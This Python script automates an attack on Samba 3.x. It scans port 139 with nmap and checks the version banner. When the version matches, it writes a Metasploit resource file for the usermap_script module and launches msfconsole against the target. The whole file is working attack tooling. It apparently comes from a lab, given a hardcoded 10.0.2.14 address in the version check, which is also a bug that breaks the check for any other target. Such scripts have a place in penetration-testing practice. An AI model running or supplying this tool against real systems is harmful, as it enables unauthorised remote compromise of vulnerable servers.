import nmap
import re
import argparse
import sys
import subprocess

def find_vuln(target):

	scanner = nmap.PortScanner()
	scanner.scan(target, "139")

	print("[*] Scanning for port 139...")

	if scanner[target].has_tcp(139):

		print("[+] Port 139 is open!")

		if re.search(r"^3\.", scanner["10.0.2.14"]["tcp"][139]["version"]):

			print(f"[+] {target} is vulnerable to usermap exploit!")
			return True

	print(f"[-] {target} is not vulnerable to usermap exploit!")
	return False


def create_config(target):

	config_file = open("msf_config.rc", "w")
	config_file.write("use exploit/multi/samba/usermap_script\n")
	config_file.write(f"set RHOSTS {target}\n")
	config_file.write("exploit\n")
	config_file.close()

	return "msf_config.rc"


def exploit(config_file):
	
	print("[+] Exploiting target...")
	subprocess.run(["msfconsole", "-r", config_file])


def main():

	parser = argparse.ArgumentParser()
	parser.add_argument("--target", dest="target", help="Specify the hostname or IP address of your target.")

	if len(sys.argv) != 3:

		parser.print_help(sys.stderr)
		sys.exit(1)

	args = parser.parse_args()

	target = args.target

	is_vulnerable = find_vuln(target)

	if is_vulnerable:

		config_file = create_config(target)
		exploit(config_file)


if __name__ == "__main__":

	main()


